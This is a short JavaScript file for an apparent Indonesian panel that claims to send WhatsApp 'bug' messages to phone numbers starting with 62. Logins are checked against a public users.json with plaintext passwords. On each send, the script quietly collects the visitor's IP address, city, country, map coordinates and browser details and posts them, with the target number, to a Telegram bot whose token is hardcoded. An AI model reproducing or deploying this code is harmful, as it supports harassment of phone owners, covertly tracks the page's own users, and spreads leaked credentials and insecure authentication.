let isCooldown = false;

async function login() {
  const user = document.getElementById("username").value;
  const pass = document.getElementById("password").value;

  const data = await fetch("users.json").then(r => r.json());
  const found = data.users.find(u => u.username === user && u.password === pass);

  if (found) {
    document.getElementById("loginBox").style.display = "none";
    document.getElementById("dashboard").style.display = "block";
  } else {
    alert("Username atau password salah!");
  }
}

async function kirim(tipe) {
  const nomor = document.getElementById("pesan").value.trim();
  if (!nomor || !nomor.startsWith("62")) return alert("Isi nomor dengan benar (harus dimulai dengan 62)");

  if (isCooldown) return alert("Tunggu 1 menit sebelum kirim lagi!");

  isCooldown = true;
  setTimeout(() => isCooldown = false, 60000); // 1 menit cooldown

  try {
    const ip = await fetch("https://ipapi.co/json/").then(res => res.json());
    const hasil = `
🔥 *${tipe}* bug dikirim ke:
📱 *Nomor*: ${nomor}

🌍 *IP*: ${ip.ip}
🏙️ *Kota*: ${ip.city}
🌐 *Negara*: ${ip.country_name}
📍 *Maps*: https://www.google.com/maps?q=${ip.latitude},${ip.longitude}
🖥️ *Device*: ${navigator.userAgent}
    `;

    await fetch("https://api.telegram.org/bot7787813252:AAHDuYArq78QFXqSSw-66L8oCO9qACyFnZk/sendMessage", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: "7607549215",
        text: hasil,
        parse_mode: "Markdown"
      })
    });

    document.getElementById("success").innerText = `✅ Success ${tipe} sent to ${nomor}`;
    document.getElementById("pesan").value = "";

  } catch (err) {
    alert("Gagal mengirim.");
    console.error(err);
  }
}